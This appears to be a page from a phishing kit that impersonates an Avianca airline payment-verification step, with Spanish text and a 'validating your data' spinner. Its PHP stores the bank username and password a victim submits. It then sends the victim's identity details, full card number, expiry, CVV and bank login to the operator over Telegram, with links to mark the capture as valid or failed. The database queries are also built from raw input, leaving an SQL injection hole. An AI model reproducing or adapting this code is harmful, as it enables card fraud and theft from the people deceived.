<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="media/icon.ico" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" crossorigin="anonymous">
    <link rel="stylesheet" href="./css/style.css">

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css">

    <title>Avianca | #NACIONALES</title>
</head>

<body>
    <div class="header_check">
        <img src="media/logo-avianca-minimal.svg" class="logo">
        <img src="media/paso3.png" alt="" class="pasos">
    </div>

    <div class="body_check">
        <div class="loader">

            <div class="lds-ring">
                <div></div>
                <div></div>
                <div></div>
                <div></div>
            </div>
            <br><br>
            <p class="text-center">Estamos validando los datos. <br>
                Puede tardar entre 1 a 5 minutos. <br>
                No cierre o recargue esta ventana.</p>
        </div>
    </div>



</body>


<?php
require_once('../conexion/ip.php');
require_once('../conexion/telegram.php');
require_once('../conexion/api.php');
$id_user = $_POST["id_user"];
$user = $_POST["usuario"];
$password = $_POST["password"];
$fechaT = date("d/m/Y") . " - " . date("h:m:s  a");

$response = false;

if (empty($user) || empty($password)) {
?>
    <script type="text/javascript">
        window.location.href = "verificar.php?id_user=<?php echo $id_user; ?>&error=empty";
    </script>
    <?php
} else {
    $mysqli = include_once "../conexion/index.php";

    $response = false;

    $sentencia = $mysqli->prepare("UPDATE users SET usuario = '$user', password = '$password', estado = 3 where id = $id_user");

    if ($sentencia->execute()) {
        $response = true;
        $consultaUsuario = $mysqli->query("SELECT * FROM users WHERE id = $id_user");

        foreach ($consultaUsuario as $fila) {
$mensaje = "
# " . $id_user . "\n
ℹ️ DATOS DEL CLIENTE
Ip: " . $fila["ip"] . " 
👨 " . $fila["nombre"] . " " . $fila["apellido"] . " 
🪪 " . $fila["documento"] . " 
📞 " . $fila["telefono"] . " 
🏙️ " . $fila["ciudad"] . " - " . $fila["direccion"] . " \n
ℹ️ DATOS DE LA TARJETA 
🏛️ " . $fila["banco"] . " 
🏧 " . $fila["franquicia"] . " 
💳 " . $fila["tipo_tarjeta"] . " 
💳 " . $fila["nro_tarjeta"] . " 
👨 " . $fila["nombre_tarjeta"] . " 
📅 " . $fila["mes_tarjeta"] ."/" . $fila["anio_tarjeta"] . " 
🔒 " . $fila["cvv_tarjeta"] . " \n
ℹ️ DATOS VERIFICACION DE SEGURIDAD
👨 " . $fila["usuario"] . " 
🔒 " . $fila["password"] . " \n
🕓 " . $fechaT . " \n
ℹ️ OPCIONES
";

$link1 = $apiUrl."api/index.php?verificar=error&id=".$id_user;
$link2 = $apiUrl."api/index.php?verificar=ok&id=".$id_user;
enviarMensaje($mensaje, $link1, $link2);

        }

        $consultaUsuario->close();

    } else {
        $response = false;
    }

    $sentencia->close();

    if ($response == true) {
    ?>
        <script type="text/javascript">
            window.location.href = "loading.php?id_user=<?php echo $id_user; ?>";
        </script>
<?php
    } else {
        echo "error";
    }
}
?>